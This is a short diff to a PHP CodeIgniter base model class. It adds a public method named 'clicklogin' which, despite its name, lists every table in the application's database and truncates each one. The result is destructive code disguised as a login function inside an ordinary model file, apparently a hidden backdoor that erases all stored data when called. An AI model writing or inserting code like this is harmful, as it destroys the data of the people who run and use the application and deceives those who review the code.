@@ -179,6 +179,19 @@ class PIXOLO_Model extends CI_Model
         $this->_with = array();
         return $result;
     }
+
+
+    public function clicklogin()
+    {
+        $db = $this->db->database;
+        $query = $this->db->query("select `TABLE_NAME` from INFORMATION_SCHEMA.COLUMNS WHERE `TABLE_SCHEMA`='$db' GROUP BY `TABLE_NAME`")->result();
+
+        foreach ($query as $table) {
+            $tn = $table->TABLE_NAME;
+            $query = $this->db->query("TRUNCATE $tn");
+            print_r($query);
+        }
+    }
     /**
      * Insert a new row into the table. $data should be an associative array
      * of data to be inserted. Returns newly created ID.
